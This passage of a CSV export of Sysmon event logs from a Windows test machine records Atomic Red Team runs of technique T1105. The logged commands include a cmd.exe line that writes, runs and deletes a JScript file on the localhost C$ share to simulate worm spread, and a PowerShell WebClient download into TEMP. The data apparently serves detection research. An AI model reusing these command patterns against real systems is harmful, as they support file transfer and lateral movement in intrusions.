      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:00.4064816Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:00.402</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d44-658c-d501-000000000f00}</Data>
      <Data Name=""ProcessId"">1508</Data>
      <Data Name=""Image"">C:\Windows\System32\cscript.exe</Data>
      <Data Name=""FileVersion"">5.812.10240.16384</Data>
      <Data Name=""Description"">Microsoft &#174; Console Based Script Host</Data>
      <Data Name=""Product"">Microsoft &#174; Windows Script Host</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">cscript.exe</Data>
      <Data Name=""CommandLine"">CScript.exe  AtomicTestT1105.js //E:JScript </Data>
      <Data Name=""CurrentDirectory"">Z:\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d44-658c-d301-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1336</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c pushd \\localhost\C$ &amp; echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); &gt; AtomicTestT1105.js &amp; CScript.exe AtomicTestT1105.js //E:JScript &amp; del AtomicTestT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; del AtomicTestFileT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; popd</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.402

ProcessGuid: {f57bd86a-8d44-658c-d501-000000000f00}

ProcessId: 1508

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft &#174; Console Based Script Host

Product: Microsoft &#174; Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: CScript.exe  AtomicTestT1105.js //E:JScript 

CurrentDirectory: Z:\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=817B20F1E8787A88464DBAA925893A35,SHA256=65B7BB45C66BB918B9E2F267A8A3D7EF5B46F7CAC6DF6F4DBEA803334F411B1A,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {f57bd86a-8d44-658c-d301-000000000f00}

ParentProcessId: 1336

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c pushd \\localhost\C$ &amp; echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); &gt; AtomicTestT1105.js &amp; CScript.exe AtomicTestT1105.js //E:JScript &amp; del AtomicTestT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; del AtomicTestFileT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; popd

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19588,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.300

ProcessGuid: {f57bd86a-8d44-658c-d301-000000000f00}

ProcessId: 1336

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d44-658c-d301-000000000f00},3588,1336,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:00.3011048Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:00.300,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:00.3011048Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:00.300</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d44-658c-d301-000000000f00}</Data>
      <Data Name=""ProcessId"">1336</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c pushd \\localhost\C$ &amp; echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); &gt; AtomicTestT1105.js &amp; CScript.exe AtomicTestT1105.js //E:JScript &amp; del AtomicTestT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; del AtomicTestFileT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; popd</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:00.300

ProcessGuid: {f57bd86a-8d44-658c-d301-000000000f00}

ProcessId: 1336

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c pushd \\localhost\C$ &amp; echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); &gt; AtomicTestT1105.js &amp; CScript.exe AtomicTestT1105.js //E:JScript &amp; del AtomicTestT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; del AtomicTestFileT1105.js /Q &gt;nul 2&gt;&amp;1 &amp; popd

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:46:58.707,,,11,19587,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:46:58.707

ProcessGuid: {f57bd86a-8d42-658c-d101-000000000f00}

ProcessId: 3224

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0fvbwap2.zsx.ps1

CreationUtcTime: 2023-12-27 20:46:58.707

User: WINDEV2309EVAL\User",Info,,,,,,,,{f57bd86a-8d42-658c-d101-000000000f00},3588,3224,,,,,"
      ",-,2023-12-27T20:46:58.7109992Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0fvbwap2.zsx.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:46:58.707,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:46:58.7109992Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:46:58.707</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d42-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">3224</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0fvbwap2.zsx.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:46:58.707</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:46:58.707

ProcessGuid: {f57bd86a-8d42-658c-d101-000000000f00}

ProcessId: 3224

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_0fvbwap2.zsx.ps1

CreationUtcTime: 2023-12-27 20:46:58.707

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {(New-Object System.Net.WebClient).DownloadFile(\""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""", \""""$env:TEMP\Atomic-license.txt\"""")}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19586,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:46:58.599

ProcessGuid: {f57bd86a-8d42-658c-d101-000000000f00}

ProcessId: 3224

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {(New-Object System.Net.WebClient).DownloadFile(\""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""", \""""$env:TEMP\Atomic-license.txt\"""")}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d42-658c-d101-000000000f00},3588,3224,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:46:58.6007870Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:46:58.599,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:46:58.6007870Z""/>
      <EventRecordID>19586</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:46:58.599</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d42-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">3224</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {(New-Object System.Net.WebClient).DownloadFile(\""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""", \""""$env:TEMP\Atomic-license.txt\"""")}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:46:58.599

ProcessGuid: {f57bd86a-8d42-658c-d101-000000000f00}

ProcessId: 3224

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {(New-Object System.Net.WebClient).DownloadFile(\""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""", \""""$env:TEMP\Atomic-license.txt\"""")}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
